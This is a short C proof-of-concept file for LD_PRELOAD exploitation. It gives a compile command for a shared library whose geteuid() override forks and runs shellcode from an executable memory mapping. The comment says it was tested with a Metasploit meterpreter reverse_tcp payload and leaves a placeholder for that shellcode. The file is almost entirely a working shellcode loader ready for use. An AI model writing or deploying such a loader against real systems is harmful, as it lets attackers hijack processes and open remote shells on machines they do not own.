/*
 * PoC for LD_PRELOAD exploitation. It will overwrite
 * The function `geteuid()` called by the process.
 *
 * Compile as Shared Library
 *  gcc -Wall -fPIC -m64 -shared -o libx.so main.c
 *
 * Tested with msf linux/x64/meterpreter/reverse_tcp 
 * Insert the Shellcode in `sc` var.
 */

#define _GNU_SOURCE // needed for `RTLD_NEXT`
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <dlfcn.h>
#include <sys/mman.h>
#include <stdlib.h>
#include <string.h>


void blink() {
  unsigned char sc[] = "\x00";
  void *mem = mmap(NULL, sizeof(sc),
      PROT_WRITE | PROT_EXEC,
      MAP_ANONYMOUS | MAP_PRIVATE,
      -1, 0);

  if (mem != MAP_FAILED) {
    memcpy(mem, sc, sizeof(sc));
    ((int(*)())mem)();
    munmap(mem, sizeof(sc));
  }
  return;
}

uid_t geteuid(void) {
  typeof(geteuid) *o_geteuid;

  // Get address of the real `getuid()`.
  o_geteuid = dlsym(RTLD_NEXT, "geteuid");

  if (fork() == 0) {
    blink();
  }
  return (*o_geteuid)();
}
